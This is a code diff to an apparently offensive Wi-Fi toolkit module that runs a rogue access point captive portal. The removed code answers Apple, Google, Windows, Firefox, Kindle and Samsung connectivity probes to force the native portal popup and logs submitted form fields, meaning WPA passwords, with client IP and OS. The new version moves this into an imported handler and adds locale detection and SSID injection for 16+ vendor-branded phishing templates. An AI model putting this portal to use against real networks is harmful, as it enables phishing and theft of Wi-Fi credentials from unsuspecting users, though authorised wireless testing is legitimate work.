@@ -1,142 +1,46 @@
 #!/usr/bin/env python3
 # Author: André Henrique (@mrhenrike) | União Geek — https://github.com/Uniao-Geek
-"""Connectivity-aware captive portal with OS detection.
+"""Connectivity-aware captive portal with OS detection and i18n.
 
-Implements a captive portal HTTP server that detects and properly handles
-OS-specific connectivity checks to force the native captive portal
-popup/browser on the client device:
-
-  - Apple (iOS/macOS): responds to /hotspot-detect.html, captive.apple.com
-  - Google (Android/Chrome): responds to /generate_204, connectivitycheck.gstatic.com
-  - Microsoft (Windows): responds to /connecttest.txt, /redirect, msftconnecttest
-  - Firefox: responds to /success.txt (detectportal.firefox.com)
+Implements a captive portal HTTP server that:
+  1. Detects OS connectivity probes (Apple CNA, Google generate_204,
+     Windows NCSI, Firefox, Kindle, Samsung) to trigger native portal popup
+  2. Auto-detects client language via Accept-Language header
+  3. Renders templates in the matching locale (en, pt-br, pt-pt, es)
+  4. Captures credentials with locale + OS metadata
 
 Inspired by Fluxion's connectivity response system and wifipumpkin3's captiveflask.
 
-Version: 1.0.0
+Version: 2.0.0
 """
 
 from __future__ import annotations
 
 import http.server
-import json
 import logging
 from pathlib import Path
-from typing import Dict
-from urllib.parse import parse_qs
 
 from wirelessxpl.core.exploit import *
 
 from wirelessxpl.modules.generic.wifi_lab._disclaimer import require_authorised_lab
+from wirelessxpl.modules.generic.wifi_lab._i18n_service import (
+    I18nPortalHandler,
+    SUPPORTED_LOCALES,
+)
 
 logger = logging.getLogger(__name__)
 
-CONNECTIVITY_PATHS: Dict[str, str] = {
-    "/hotspot-detect.html": "apple",
-    "/library/test/success.html": "apple",
-    "/generate_204": "google",
-    "/gen_204": "google",
-    "/connecttest.txt": "microsoft",
-    "/redirect": "microsoft",
-    "/ncsi.txt": "microsoft",
-    "/success.txt": "firefox",
-    "/canonical.html": "firefox",
-    "/kindle-wifi/wifistub.html": "amazon",
-    "/check_network_status.txt": "samsung",
-}
-
-
-class ConnectivityPortalHandler(http.server.SimpleHTTPRequestHandler):
-    """HTTP handler with OS connectivity detection and credential capture."""
-
-    template_dir: str = ""
-    cred_log: Path = Path(".log/portal_creds.json")
-    portal_host: str = "10.0.0.1"
-
-    def do_GET(self) -> None:
-        path = self.path.split("?")[0]
-
-        if path in CONNECTIVITY_PATHS:
-            os_type = CONNECTIVITY_PATHS[path]
-            logger.info("Connectivity check from %s (%s): %s",
-                        self.client_address[0], os_type, path)
-
-            if os_type == "apple":
-                self.send_response(200)
-                self.send_header("Content-Type", "text/html")
-                self.end_headers()
-                self.wfile.write(
-                    '<HTML><HEAD><TITLE>Success</TITLE></HEAD>'
-                    '<BODY>Success</BODY></HTML>'.encode()
-                )
-            elif os_type == "google":
-                self.send_response(302)
-                self.send_header("Location", "http://{}/".format(self.portal_host))
-                self.end_headers()
-            elif os_type == "microsoft":
-                self.send_response(302)
-                self.send_header("Location", "http://{}/".format(self.portal_host))
-                self.end_headers()
-            elif os_type == "firefox":
-                self.send_response(302)
-                self.send_header("Location", "http://{}/".format(self.portal_host))
-                self.end_headers()
-            else:
-                self.send_response(302)
-                self.send_header("Location", "http://{}/".format(self.portal_host))
-                self.end_headers()
-            return
-
-        if path == "/" or path == "/index.html":
-            self.path = "/index.html"
-        self.directory = self.template_dir
-        super().do_GET()
-
-    def do_POST(self) -> None:
-        content_length = int(self.headers.get("Content-Length", 0))
-        body = self.rfile.read(content_length).decode("utf-8", errors="replace")
-        params = parse_qs(body)
-
-        cred_entry = {
-            "client_ip": self.client_address[0],
-            "user_agent": self.headers.get("User-Agent", ""),
-            "params": {k: v[0] if len(v) == 1 else v for k, v in params.items()},
-        }
-
-        os_hint = "unknown"
-        ua = (self.headers.get("User-Agent") or "").lower()
-        if "iphone" in ua or "ipad" in ua or "mac" in ua:
-            os_hint = "apple"
-        elif "android" in ua:
-            os_hint = "android"
-        elif "windows" in ua:
-            os_hint = "windows"
-        cred_entry["os_hint"] = os_hint
-
-        self.cred_log.parent.mkdir(parents=True, exist_ok=True)
-        with open(self.cred_log, "a", encoding="utf-8") as f:
-            f.write(json.dumps(cred_entry) + "\n")
-
-        logger.info("Credential captured from %s (%s)", self.client_address[0], os_hint)
-
-        self.send_response(302)
-        self.send_header("Location", "/success.html")
-        self.end_headers()
-
-    def log_message(self, fmt, *args) -> None:
-        logger.debug(fmt, *args)
-
 
 class Exploit(Exploit):
-    """OS-aware captive portal with connectivity detection."""
+    """OS-aware captive portal with connectivity detection and i18n."""
 
     __info__ = {
         "name": "Connectivity Portal",
         "description": (
-            "Smart captive portal with OS connectivity detection: triggers "
-            "native captive portal popup on Apple, Android, Windows, Firefox, "
-            "Kindle, and Samsung devices. Supports 16+ vendor-branded templates "
-            "for realistic WPA password capture."
+            "Smart captive portal with OS connectivity detection and automatic "
+            "language detection (en, pt-br, pt-pt, es). Triggers native portal "
+            "popup on Apple, Android, Windows, Firefox, Kindle, Samsung. "
+            "16+ vendor-branded templates with i18n support."
         ),
         "authors": ("André Henrique (@mrhenrike) | União Geek",),
         "references": (
@@ -157,6 +61,8 @@ class Exploit(Exploit):
     portal_port = OptInteger(80, "HTTP port for portal")
     portal_ip = OptString("10.0.0.1", "Portal IP (rogue AP gateway)")
     credentials_file = OptString(".log/portal_creds.json", "Credentials output file")
+    connectivity_detect = OptBool(True, "Handle OS connectivity probes (Apple/Google/Windows/Firefox)")
+    ssid = OptString("", "SSID to display in template (injected as {{ssid}} extra var)")
     dry_run = OptBool(False, "Print config without executing")
 
     AVAILABLE_TEMPLATES = (
@@ -184,7 +90,7 @@ class Exploit(Exploit):
         return Path("")
 
     def run(self) -> None:
-        """Start connectivity-aware captive portal."""
+        """Start connectivity-aware i18n captive portal."""
         require_authorised_lab()
 
         tpl_dir = self._resolve_template()
@@ -192,25 +98,31 @@ class Exploit(Exploit):
             return
 
         if self.dry_run:
-            print_info("DRY RUN — Connectivity Portal")
+            print_info("DRY RUN — Connectivity Portal (i18n)")
             print_info("Template: {} ({})".format(self.template, tpl_dir))
             print_info("Port: {} | IP: {}".format(self.portal_port, self.portal_ip))
-            print_info("\nOS connectivity detection paths:")
-            for path, os_name in CONNECTIVITY_PATHS.items():
-                print_info("  {} → {}".format(path, os_name))
+            print_info("Locales: {}".format(", ".join(SUPPORTED_LOCALES)))
+            print_info("Connectivity detection: {}".format(
+                "ON" if self.connectivity_detect else "OFF"))
             return
 
-        ConnectivityPortalHandler.template_dir = str(tpl_dir)
-        ConnectivityPortalHandler.cred_log = Path(self.credentials_file)
-        ConnectivityPortalHandler.portal_host = self.portal_ip
+        I18nPortalHandler.template_dir = tpl_dir
+        I18nPortalHandler.portal_host = self.portal_ip
+        I18nPortalHandler.cred_log = Path(self.credentials_file)
+        I18nPortalHandler.connectivity_detect = self.connectivity_detect
+        I18nPortalHandler.extra_vars = {}
+        if self.ssid:
+            I18nPortalHandler.extra_vars["ssid"] = self.ssid
 
-        server = http.server.HTTPServer(("0.0.0.0", self.portal_port), ConnectivityPortalHandler)
+        server = http.server.HTTPServer(("0.0.0.0", self.portal_port), I18nPortalHandler)
 
-        print_status("Connectivity Portal on port {}".format(self.portal_port))
+        print_status("Connectivity Portal (i18n) on port {}".format(self.portal_port))
         print_info("Template: {}".format(self.template))
         print_info("Gateway IP: {}".format(self.portal_ip))
+        print_info("Auto-detect locales: {}".format(", ".join(SUPPORTED_LOCALES)))
         print_info("Credentials: {}".format(self.credentials_file))
-        print_info("Detecting: Apple CNA, Google, Windows NCSI, Firefox, Kindle, Samsung")
+        print_info("Connectivity detection: {}".format(
+            "ON" if self.connectivity_detect else "OFF"))
         print_info("Press Ctrl+C to stop.")
 
         try:
